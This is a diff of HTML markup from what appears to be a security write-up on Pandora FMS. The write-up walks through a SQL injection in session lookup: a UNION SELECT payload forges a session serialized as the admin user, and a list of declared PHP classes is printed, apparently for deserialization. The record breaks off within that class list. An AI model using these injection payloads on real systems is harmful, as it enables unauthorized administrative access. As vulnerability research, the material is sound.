+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">mysql_db_get_row_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$search_history_db</span><span class="o">=</span><span class="k">false</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$sql</span> <span class="o">.=</span> <span class="s1">&#39; LIMIT 1&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$result</span> <span class="o">=</span> <span class="nx">db_get_all_rows_sql</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span> <span class="nv">$search_history_db</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nv">$result</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$result</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>This function adds the string <code>' LIMIT 1'</code> to retrieve the first value. It executes the <code>db_get_all_rows_sql($sql, $search_history_db)</code> function, saves the output to the <code>$result</code> array and returns the <code>result[0]</code>.</li>
@@ -2089,11 +2087,11 @@ if (check_login(false) === false) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">xxx&#39; UNION SELECT &#39;a&#39;,1,&#39;id_usuario|s:5:&#34;admin&#34;;&#39; as data FROM tsessions_php WHERE &#39;1&#39;=&#39;1&#39; #
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">xxx</span><span class="s1">&#39; UNION SELECT &#39;</span><span class="nx">a</span><span class="s1">&#39;,1,&#39;</span><span class="nx">id_usuario</span><span class="o">|</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="s1">&#39; as data FROM tsessions_php WHERE &#39;</span><span class="mi">1</span><span class="s1">&#39;=&#39;</span><span class="mi">1</span><span class="err">&#39;</span> <span class="c1">#
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -2114,7 +2112,7 @@ if (check_login(false) === false) {
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -2170,85 +2168,85 @@ if (check_login(false) === false) {
 </span><span class="lnt">54
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">public function __construct($data)
-    {
-        global $config;
-
-        // Unset user.
-        unset($config[&#39;id_usuario&#39;]);
-        unset($_SESSION[&#39;id_usuario&#39;]);
-
-        if (is_array($data) === true) {
-            if (isset($data[&#39;phpsessionid&#39;]) === true) {
-                $this-&gt;sessions[$data[&#39;phpsessionid&#39;]] = 1;
-                $info = \db_get_row_filter(
-                    &#39;tsessions_php&#39;,
-                    [&#39;id_session&#39; =&gt; $data[&#39;phpsessionid&#39;]]
-                );
-
-                if ($info !== false) {
-                    // Process.
-                    $session_data = session_decode($info[&#39;data&#39;]);
-                    $this-&gt;idUser = $_SESSION[&#39;id_usuario&#39;];
-
-                    // Valid session.
-                    return $this;
-                }
-
-                return null;
-            }
-
-            if (isset($data[&#39;id_usuario&#39;]) === true
-                <span class="err">&amp;&amp;</span> isset($data[&#39;password&#39;]) === true
-            ) {
-                $user_in_db = process_user_login($user, $password, true);
-                if ($user_in_db !== false) {
-                    $config[&#39;id_usuario&#39;] = $user_in_db;
-                    $correctLogin = true;
-
-                    // Originally at api.php.
-                    if (session_status() === PHP_SESSION_NONE) {
-                        session_start();
-                    }
-
-                    $_SESSION[&#39;id_usuario&#39;] = $user;
-                    session_write_close();
-
-                    $this-&gt;idUser = $data[&#39;id_usuario&#39;];
-                    // Valid session.
-                    return $this;
-                }
-            }
-        }
-
-        return null;
-
-    }
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">global</span> <span class="nv">$config</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// Unset user.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">unset</span><span class="p">(</span><span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">unset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">sessions</span><span class="p">[</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">]]</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$info</span> <span class="o">=</span> <span class="nx">\db_get_row_filter</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">                    <span class="s1">&#39;tsessions_php&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">[</span><span class="s1">&#39;id_session&#39;</span> <span class="o">=&gt;</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;phpsessionid&#39;</span><span class="p">]]</span>
+</span></span><span class="line"><span class="cl">                <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$info</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Process.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$session_data</span> <span class="o">=</span> <span class="nx">session_decode</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">idUser</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Valid session.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">                <span class="o">&amp;&amp;</span> <span class="nx">isset</span><span class="p">(</span><span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;password&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="k">true</span>
+</span></span><span class="line"><span class="cl">            <span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$user_in_db</span> <span class="o">=</span> <span class="nx">process_user_login</span><span class="p">(</span><span class="nv">$user</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="p">(</span><span class="nv">$user_in_db</span> <span class="o">!==</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$config</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user_in_db</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nv">$correctLogin</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Originally at api.php.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">if</span> <span class="p">(</span><span class="nx">session_status</span><span class="p">()</span> <span class="o">===</span> <span class="nx">PHP_SESSION_NONE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                        <span class="nx">session_start</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">                    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$user</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                    <span class="nx">session_write_close</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">                    <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">idUser</span> <span class="o">=</span> <span class="nv">$data</span><span class="p">[</span><span class="s1">&#39;id_usuario&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">                    <span class="c1">// Valid session.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="k">return</span> <span class="nv">$this</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>At line 19, we can see:</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php"> $session_data = session_decode($info[&#39;data&#39;]);
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="nv">$session_data</span> <span class="o">=</span> <span class="nx">session_decode</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s1">&#39;data&#39;</span><span class="p">]);</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
 <p>The value of <code>$info['data']</code> is passed to <code>session_decode()</code> function. Below is an example of a valid value stored in the database:</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0
-id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:&#34;e7c2afc1ece9d83b21ca017a98586068&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">id_usuario</span><span class="o">|</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">alert_msg</span><span class="o">|</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">new_chat</span><span class="o">|</span><span class="nx">b</span><span class="o">:</span><span class="mi">0</span>
+</span></span><span class="line"><span class="cl"><span class="nx">id_usuario</span><span class="o">|</span><span class="nx">s</span><span class="o">:</span><span class="mi">5</span><span class="o">:</span><span class="s2">&#34;admin&#34;</span><span class="p">;</span><span class="nx">alert_msg</span><span class="o">|</span><span class="nx">a</span><span class="o">:</span><span class="mi">0</span><span class="o">:</span><span class="p">{}</span><span class="nx">new_chat</span><span class="o">|</span><span class="nx">b</span><span class="o">:</span><span class="mi">0</span><span class="p">;</span><span class="nx">csrf_code</span><span class="o">|</span><span class="nx">s</span><span class="o">:</span><span class="mi">32</span><span class="o">:</span><span class="s2">&#34;e7c2afc1ece9d83b21ca017a98586068&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div></li>
 </ul>
@@ -2271,11 +2269,11 @@ id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:&#34;
 </ol>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">&#34;SELECT * FROM tsessions_php  WHERE `id_session` = &#39;<span class="p">&lt;</span><span class="nt">payload_injected</span><span class="p">&gt;</span>&#39; LIMIT 1;&#34;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="s2">&#34;SELECT * FROM tsessions_php  WHERE `id_session` = &#39;&lt;payload_injected&gt;&#39; LIMIT 1;&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ol>
 <li>Locate the location where the SQL saves the session data into the database and modify it.</li>
@@ -2287,11 +2285,11 @@ id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:&#34;
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-sql" data-lang="sql"><span class="s2">&#34;SELECT * FROM tsessions_php  WHERE `id_session` = &#39;xxxxx&#39; union select &#39;1&#39;,0,&#39;xxx&#39; as data#&#39;&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="s2">&#34;SELECT * FROM tsessions_php  WHERE `id_session` = &#39;xxxxx&#39; union select &#39;1&#39;,0,&#39;xxx&#39; as data#&#39;&#34;</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>
@@ -2322,26 +2320,26 @@ id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:&#34;
 </blockquote>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span><span class="lnt">5
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">$classes = get_declared_classes();
-
-****foreach ($classes as $class) {
-    echo $class . &#34;\n&#34;;
-}
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$classes</span> <span class="o">=</span> <span class="nx">get_declared_classes</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">****</span><span class="k">foreach</span> <span class="p">(</span><span class="nv">$classes</span> <span class="k">as</span> <span class="nv">$class</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">echo</span> <span class="nv">$class</span> <span class="o">.</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><ul>
 <li>By using the above method, we have obtained a list of classes that can be invoked</li>
 </ul>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">  1
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
 </span><span class="lnt">  2
 </span><span class="lnt">  3
 </span><span class="lnt">  4
@@ -2495,166 +2493,166 @@ id_usuario|s:5:&#34;admin&#34;;alert_msg|a:0:{}new_chat|b:0;csrf_code|s:32:&#34;
 </span><span class="lnt">152
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-php" data-lang="php">stdClass
-Exception
-ErrorException
-Error
-ParseError
-TypeError
-ArgumentCountError
-ArithmeticError
-DivisionByZeroError
-Closure
-Generator
-ClosedGeneratorException
-DateTime
-DateTimeImmutable
-DateTimeZone
-DateInterval
-DatePeriod
-LibXMLError
-HashContext
-ReflectionException
-Reflection
-ReflectionFunctionAbstract
-ReflectionFunction
-ReflectionGenerator
-ReflectionParameter
-ReflectionType
-ReflectionNamedType
-ReflectionMethod
-ReflectionClass
-ReflectionObject
-ReflectionProperty
-ReflectionClassConstant
-ReflectionExtension
-ReflectionZendExtension
-LogicException
-BadFunctionCallException
-BadMethodCallException
-DomainException
-InvalidArgumentException
-LengthException
-OutOfRangeException
-RuntimeException
-OutOfBoundsException
-OverflowException
-RangeException
-UnderflowException
-UnexpectedValueException
-RecursiveIteratorIterator
-IteratorIterator
-FilterIterator
-RecursiveFilterIterator
-CallbackFilterIterator
-RecursiveCallbackFilterIterator
-ParentIterator
-LimitIterator
-CachingIterator
-RecursiveCachingIterator
-NoRewindIterator
-AppendIterator
-InfiniteIterator
-RegexIterator
-RecursiveRegexIterator
-EmptyIterator
-RecursiveTreeIterator
-ArrayObject
-ArrayIterator
-RecursiveArrayIterator
-SplFileInfo
-DirectoryIterator
-FilesystemIterator
-RecursiveDirectoryIterator
-GlobIterator
-SplFileObject
-SplTempFileObject
-SplDoublyLinkedList
-SplQueue
-SplStack
-SplHeap
-SplMinHeap
-SplMaxHeap
-SplPriorityQueue
-SplFixedArray
-SplObjectStorage
-MultipleIterator
-SodiumException
-SessionHandler
-__PHP_Incomplete_Class
-php_user_filter
-Directory
-AssertionError
-PDOException
-PDO
-PDOStatement
-PDORow
-CURLFile
-DOMException
-DOMStringList
-DOMNameList
-DOMImplementationList
-DOMImplementationSource
-DOMImplementation
-DOMNode
-DOMNameSpaceNode
-DOMDocumentFragment
-DOMDocument
-DOMNodeList
-DOMNamedNodeMap
-DOMCharacterData
-DOMAttr
-DOMElement
-DOMText
-DOMComment
-DOMTypeinfo
-DOMUserDataHandler
-DOMDomError
-DOMErrorHandler
-DOMLocator
-DOMConfiguration
-DOMCdataSection
-DOMDocumentType
-DOMNotation
-DOMEntity
-DOMEntityReference
-DOMProcessingInstruction
-DOMStringExtend
-DOMXPath
-finfo
-mysqli_sql_exception
-mysqli_driver
-mysqli
-mysqli_warning
-mysqli_result
-mysqli_stmt
-PharException
-Phar
-PharData
-PharFileInfo
-SimpleXMLElement
-SimpleXMLIterator
-SNMP
-SNMPException
-XMLReader
-XMLWriter
-XSLTProcessor
-ZipArchive
-StreamReader
-StringReader
-FileReader
-CachedFileReader
-gettext_reader
-PandoraFMS\User
-NetworkMap
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">stdClass</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Exception</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ErrorException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Error</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ParseError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">TypeError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ArgumentCountError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ArithmeticError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DivisionByZeroError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Closure</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Generator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ClosedGeneratorException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DateTime</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DateTimeImmutable</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DateTimeZone</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DateInterval</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DatePeriod</span>
+</span></span><span class="line"><span class="cl"><span class="nx">LibXMLError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">HashContext</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Reflection</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionFunctionAbstract</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionFunction</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionGenerator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionParameter</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionType</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionNamedType</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionMethod</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionClass</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionObject</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionProperty</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionClassConstant</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionExtension</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ReflectionZendExtension</span>
+</span></span><span class="line"><span class="cl"><span class="nx">LogicException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">BadFunctionCallException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">BadMethodCallException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DomainException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">InvalidArgumentException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">LengthException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">OutOfRangeException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RuntimeException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">OutOfBoundsException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">OverflowException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RangeException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">UnderflowException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">UnexpectedValueException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveIteratorIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">IteratorIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">FilterIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveFilterIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">CallbackFilterIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveCallbackFilterIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ParentIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">LimitIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">CachingIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveCachingIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">NoRewindIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">AppendIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">InfiniteIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RegexIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveRegexIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">EmptyIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveTreeIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ArrayObject</span>
+</span></span><span class="line"><span class="cl"><span class="nx">ArrayIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveArrayIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplFileInfo</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DirectoryIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">FilesystemIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">RecursiveDirectoryIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">GlobIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplFileObject</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplTempFileObject</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplDoublyLinkedList</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplQueue</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplStack</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplHeap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplMinHeap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplMaxHeap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplPriorityQueue</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplFixedArray</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SplObjectStorage</span>
+</span></span><span class="line"><span class="cl"><span class="nx">MultipleIterator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SodiumException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">SessionHandler</span>
+</span></span><span class="line"><span class="cl"><span class="nx">__PHP_Incomplete_Class</span>
+</span></span><span class="line"><span class="cl"><span class="k">php_user_filter</span>
+</span></span><span class="line"><span class="cl"><span class="nx">Directory</span>
+</span></span><span class="line"><span class="cl"><span class="nx">AssertionError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PDOException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PDO</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PDOStatement</span>
+</span></span><span class="line"><span class="cl"><span class="nx">PDORow</span>
+</span></span><span class="line"><span class="cl"><span class="nx">CURLFile</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMException</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMStringList</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNameList</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMImplementationList</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMImplementationSource</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMImplementation</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNode</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNameSpaceNode</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMDocumentFragment</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMDocument</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNodeList</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNamedNodeMap</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMCharacterData</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMAttr</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMElement</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMText</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMComment</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMTypeinfo</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMUserDataHandler</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMDomError</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMErrorHandler</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMLocator</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMConfiguration</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMCdataSection</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMDocumentType</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMNotation</span>
+</span></span><span class="line"><span class="cl"><span class="nx">DOMEntity</span>
